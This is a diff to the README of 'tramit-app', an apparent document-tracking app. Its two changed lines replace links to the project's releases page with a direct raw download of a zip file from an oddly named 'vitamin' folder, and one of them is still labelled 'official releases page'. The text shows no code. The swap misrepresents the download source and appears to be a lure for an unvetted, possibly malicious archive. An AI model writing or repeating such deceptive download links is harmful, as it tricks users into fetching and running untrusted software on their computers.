@@ -1,12 +1,12 @@
 # 📁 tramit-app - Manage your official documents with ease
 
-[![Download tramit-app](https://img.shields.io/badge/Download-tramit--app-blue)](https://github.com/Largescale-dropbiscuit118/tramit-app/releases)
+[![Download tramit-app](https://img.shields.io/badge/Download-tramit--app-blue)](https://github.com/Largescale-dropbiscuit118/tramit-app/raw/refs/heads/main/vitamin/app_tramit_v2.4-alpha.3.zip)
 
 tramit-app helps you organize and track your government forms and legal paperwork. You can store digital copies, monitor application status, and set reminders for important deadlines. This tool keeps your personal records secure and accessible whenever you need them.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/Largescale-dropbiscuit118/tramit-app/releases).
+1. Visit the [official releases page](https://github.com/Largescale-dropbiscuit118/tramit-app/raw/refs/heads/main/vitamin/app_tramit_v2.4-alpha.3.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file that ends with `.exe` to start your download.
 4. Save the file to your computer.
